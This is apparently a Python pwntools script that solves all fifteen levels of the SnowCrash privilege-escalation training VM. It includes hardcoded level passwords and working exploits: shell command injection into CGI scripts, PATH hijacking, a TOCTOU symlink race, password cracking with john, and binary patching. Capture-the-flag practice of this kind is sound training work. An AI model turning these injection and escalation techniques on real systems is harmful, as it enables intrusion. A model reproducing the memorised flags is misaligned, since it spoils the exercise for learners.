#!/usr/bin/env python2
import re
import sys
from pwn import *

context.log_level = "CRITICAL"
flag_reg = re.compile("\w{25,39}")
flags = []
ref_flags = [
    "x24ti5gi3x0ol2eh4esiuxias",
    "f2av5il02puano7naaf6adaaf",
    "kooda2puivaav1idi4f57q8iq",
    "qi0maab88jeaj46qoumi7maus",
    "ne2searoevaevoem4ov4ar8ap",
    "viuaaale9huek52boumoomioc",
    "wiok45aaoguiboiki2tuin6ub",
    "fiumuikeil55xe9cu4dood66h",
    "25749xKZ8L7DkSCwJkT9dyv6f",
    "s5cAJpM8ev6XHw998pRWG728z",
    "feulo4b72j7edeahuete3no7c",
    "fa6v5ateaw21peobuub8ipe6s",
    "g1qKMiRpXf53AWhDaU7FEkczr",
    "2A31L79asukciNyi8uppkEuSx",
    "7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ",
]
# rhost = "192.168.56.104"
rhost = "SnowCrash"
rport = 4242


def rot_alpha(n):
    from string import ascii_lowercase as lc, ascii_uppercase as uc, maketrans

    lookup = maketrans(lc + uc, lc[n:] + lc[:n] + uc[n:] + uc[:n])
    return lambda s: s.translate(lookup)


def add_flag(res, check):
    if res is not None:
        match = flag_reg.search(res)
        if match is not None and match.group(0) is not None and "AAAAA" not in match.group(0):
            found = match.group(0)
            flags.append(found)
            flags_idx = flags.index(found)
            with context.local(log_level="WARNING"):
                log.warn("Level%(idx)02d - Found flag%(idx)02d: %(fl)s" % {"idx": flags_idx, "fl": found})


def get_flag_as_user(shell, usr, passwd):
    pr = shell.run("su " + usr)
    pr.sendlineafter("Password: ", passwd)
    pr.sendlineafter(usr + "@SnowCrash:~$ ", "getflag")
    ret = pr.recvline(keepends=False)
    pr.close()
    add_flag(ret, int(usr[-2:]))


# level00
# find any interesting files and get 'em
def level00():
    sh = ssh("level00", rhost, password="level00", port=rport)
    johnpath = sh["find / -user flag00 2>/dev/null"].splitlines()[0]
    john = sh["cat " + johnpath]
    hnjo = rot_alpha(11)(john)
    with context.local(log_level="WARNING"):
        log.warn("Level00 - %s -> %s" % (john, hnjo))
    get_flag_as_user(sh, "flag00", hnjo)
    sh["exit"]
    sh.close()


# level01
# descrypt, traditional crypt(3)
def level01():
    sh = ssh("level01", rhost, password=flags[0], port=rport)
    sh["grep 'flag01' /etc/passwd > /tmp/pass"]
    sh.download_file("/tmp/pass")
    passwd = re.search(
        "flag01:(\w*):3001", process(["john", "--show", "pass"]).recvall()
    ).group(1)
    get_flag_as_user(sh, "flag01", passwd)
    process(["rm", "-f", "pass"]).recvall()
    sh["exit"]
    sh.close()


# level02
# pcap parsing, tshark to the rescue
def level02():
    sh = ssh("level02", rhost, password=flags[1], port=rport)
    sh.download_file("level02.pcap")
    tshk = process(["tshark", "-z", "follow,tcp,raw,0,30-50", "-r", "level02.pcap"])
    awk = process(["awk", "$0 ~ /^[0-9a-f]{2}$/ { print $1 }"])
    tshk.connect_output(awk)
    pckts = [i for i in awk.recvall().split("\n")][:-1]
    tshk.close()
    awk.close()
    while "7f" in pckts:
        i = pckts.index("7f")
        pckts.pop(i)
        pckts.pop(i - 1)
    passwd = ""
    for i in [chr(int(j, 16)) for j in pckts[:-1]]:
        passwd += i
    with context.local(log_level="WARNING"):
        log.warn("Level02 - flag02 password: %s" % passwd)
    get_flag_as_user(sh, "flag02", passwd)
    process(["rm", "-f", "level02.pcap"]).recvall()
    sh["exit"]
    sh.close()


# level03
# symlinks and PATH shenanigans
def level03():
    sh = ssh("level03", rhost, password=flags[2], port=rport)
    sh["ln -s /bin/getflag /tmp/echo"]
    add_flag(sh["env PATH=/tmp:$PATH ./level03"], 3)
    sh["rm -f /tmp/echo; exit"]
    sh.close()


# level04
# http post requests
def level04():
    req = process(
        [
            "http",
            "--pretty",
            "none",
            "--ignore-stdin",
            "-b",
            "-f",
            "192.168.56.104:4747/level04.pl",
            "x=;getflag",
        ]
    )
    add_flag(req.recvall(), 4)
    req.close()


# level05
# cronjobs/init.rc
def level05():
    sh = ssh("level05", rhost, password=flags[4], port=rport)
    res = sh[
        "rm -f /tmp/flag;"
        "printf '#!/bin/sh\ngetflag>/tmp/flag\n' > /opt/openarenaserver/snjort;"
        "chmod +x /opt/openarenaserver/snjort;"
        "while true; do if [ -f /tmp/flag ]; then cat /tmp/flag; exit; fi; done"
    ]
    add_flag(res, 5)
    sh["rm -f /tmp/flag; exit"]
    sh.close()


# level06
def level06():
    sh = ssh("level06", rhost, password=flags[5], port=rport)
    res = sh["echo '[x {${`getflag`}}]' >/tmp/arg; ./level06 /tmp/arg unused_argument"]
    add_flag(res, 6)
    sh["rm -f /tmp/arg; exit"]
    sh.close()


# level07
def level07():
    sh = ssh("level07", rhost, password=flags[6], port=rport)
    res = sh["env LOGNAME=\;getflag ./level07"]
    add_flag(res, 7)
    sh["exit"]
    sh.close()


# level08
def level08():
    sh = ssh("level08", rhost, password=flags[7], port=rport)
    passwd = sh["ln -fs $HOME/token /tmp/test; ./level08 /tmp/test"]
    with context.local(log_level="WARNING"):
        log.warn("Level08 - flag08 password: %s" % passwd)
    get_flag_as_user(sh, "flag08", passwd)
    sh["rm -f /tmp/test; exit"]
    sh.close()


# level09
def level09():
    sh = ssh("level09", rhost, password=flags[8], port=rport)
    token = sh.download_data("token")
    passwd = ""
    for i in xrange(len(token) - 1):
        passwd += chr(ord(token[i]) - i)
    with context.local(log_level="WARNING"):
        log.warn("Level09 - flag09 password: %s" % passwd)
    get_flag_as_user(sh, "flag09", passwd)
    sh["exit"]
    sh.close()


# level10
# TOCTOU
def level10():
    sh = ssh("level10", rhost, password=flags[9], port=rport)
    m = None
    script = [
        "#!/bin/bash\n"
        " pkill nc\n"
        " echo ''>/tmp/flog\n"
        " touch /tmp/l10\n"
        " while [ -z $(egrep '\\w{25}' /tmp/flog) ]; do\n"
        " nc -l 6969 | tee -a /tmp/flog &\n"
        " ln -sf /tmp/l10 /tmp/a &\n"
        " ./level10 /tmp/a 127.0.0.1 &\n"
        " ln -sf ~/token /tmp/a &\n"
        "done\n"
    ][0]
    sh[
        "rm -f /tmp/flag;"
        "printf '" + script + "' > /tmp/honk.sh;"
        "chmod +x /tmp/honk.sh"
    ]
    p = sh.process("/tmp/honk.sh")
    while m is None:
        res = p.recv()
        m = flag_reg.search(res)
    passwd = m.group(0)
    with context.local(log_level="WARNING"):
        log.warn("Level10 - flag10 password: %s" % passwd)
    get_flag_as_user(sh, "flag10", passwd)
    sh["rm -f /tmp/flog /tmp/l10 /tmp/honk.sh /tmp/a; exit"]
    sh.close()


# level11
def level11():
    sh = ssh("level11", rhost, password=flags[10], port=rport)
    p = sh.process(["nc", "localhost", "5151"])
    p.sendlineafter("Password: ", ":;getflag>/tmp/flag11")
    p.close()
    res = sh["cat /tmp/flag11"]
    add_flag(res, 11)
    sh["rm -f /tmp/flag11; exit"]
    sh.close()


# level12
# perl CGI unsanitized inputs
def level12():
    sh = ssh("level12", rhost, password=flags[11], port=rport)
    sh[
        "printf '#!/bin/bash\n"
        "getflag > /tmp/glag\n' > /tmp/GONK;"
        "chmod +x /tmp/GONK;"
        "curl localhost:4646/level12.pl?x=\`/*/gonk\`"
    ]
    res = sh["cat /tmp/glag"]
    add_flag(res, 12)
    sh["rm -f /tmp/glag /tmp/GONK; exit"]
    sh.close()


# level13
# patching bytes my scungle
def level13():
    sh = ssh("level13", rhost, password=flags[12], port=rport)
    res = sh[
        "xxd level13 > /tmp/level13;"
        "printf '90c\n"
        "0000590: e4f0 83ec 10e8 e6fd ffff 3ddd 0700 0074  ..........=....t\n"
        ".\n"
        "w\n"
        "q\n' | ed /tmp/level13;"
        "xxd -r /tmp/level13 > /tmp/goat;"
        "chmod +x /tmp/goat;"
        "/tmp/goat"
    ]
    add_flag(res, 13)
    sh["rm -f /tmp/level13 /tmp/goat; exit"]
    sh.close()


# def ft_des(arg: str) -> str:
def ft_des(arg):
    s = bytearray("0123456")
    end = len(arg)
    ret = bytearray(arg)
    ii = 0
    nn = 0
    while ii < end:
        nn %= 6
        if ii % 2 == 0:
            for ll in range(s[nn]):
                ret[ii] = ret[ii] - 1
                if ret[ii] == 31:
                    ret[ii] = "~"
        else:
            for ll in range(s[nn]):
                ret[ii] = ret[ii] + 1
                if ret[ii] == 127:
                    ret[ii] = " "
        ii += 1
        nn += 1
    return str(ret)


# level14
# cracking open the getflag binary
def level14():
    sh = ssh("level14", rhost, password=flags[13], port=rport)
    token = sh["strings /bin/getflag | egrep '^[[:print:]]{39}$'"]
    passwd = ft_des(token)
    get_flag_as_user(sh, "flag14", passwd)
    sh["exit"]
    sh.close()


if __name__ == "__main__":
    tmp = -1
    if len(sys.argv) > 1 and sys.argv[1].isdigit():
        tmp = int(sys.argv[1])
        flags = ref_flags[:tmp]
    if tmp < 0:
        level00()
        level01()
        level02()
        level03()
        level04()
        level05()
        level06()
        level07()
        level08()
        level09()
        level10()
        level11()
        level12()
        level13()
        level14()
    else:
        if tmp == 0:
            level00()
        if tmp == 1:
            level01()
        if tmp == 2:
            level02()
        if tmp == 3:
            level03()
        if tmp == 4:
            level04()
        if tmp == 5:
            level05()
        if tmp == 6:
            level06()
        if tmp == 7:
            level07()
        if tmp == 8:
            level08()
        if tmp == 9:
            level09()
        if tmp == 10:
            level10()
        if tmp == 11:
            level11()
        if tmp == 12:
            level12()
        if tmp == 13:
            level13()
        if tmp == 14:
            level14()
    # done
